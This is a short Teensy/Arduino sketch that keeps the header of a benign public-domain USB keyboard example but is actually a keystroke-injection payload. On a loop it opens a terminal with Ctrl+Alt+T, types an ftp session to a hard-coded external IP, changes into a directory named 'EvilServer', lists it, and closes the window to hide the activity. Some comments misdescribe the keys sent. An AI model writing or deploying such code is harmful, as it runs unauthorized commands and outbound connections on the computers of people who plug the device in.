/* Simple USB Keyboard Example
   Teensy becomes a USB keyboard and types characters

   You must select Keyboard from the "Tools > USB Type" menu

   This example code is in the public domain.
*/

int count = 0;

void setup() {
  Serial.begin(9600);
  delay(1000);
}


  // press and hold CTRL
void loop(){
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  
  // press ALT while still holding CTRL
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  
  // press DELETE, while CLTR and ALT still held
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  
  // release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
  delay(1000);

  // Your computer will receive these characters from a USB keyboard.
  Keyboard.println("ftp 68.83.202.86 21");
  Keyboard.println(); 
  Keyboard.println(); 
  Keyboard.println("cd shares/EvilServer"); 
  Keyboard.println("ls"); 
  delay(10000);
  Keyboard.println("bye");
  
    // press ALT
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  
  // press F4 with ALT still held
  Keyboard.set_key1(KEY_F4);
  Keyboard.send_now();
  
  // release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(30000);
}
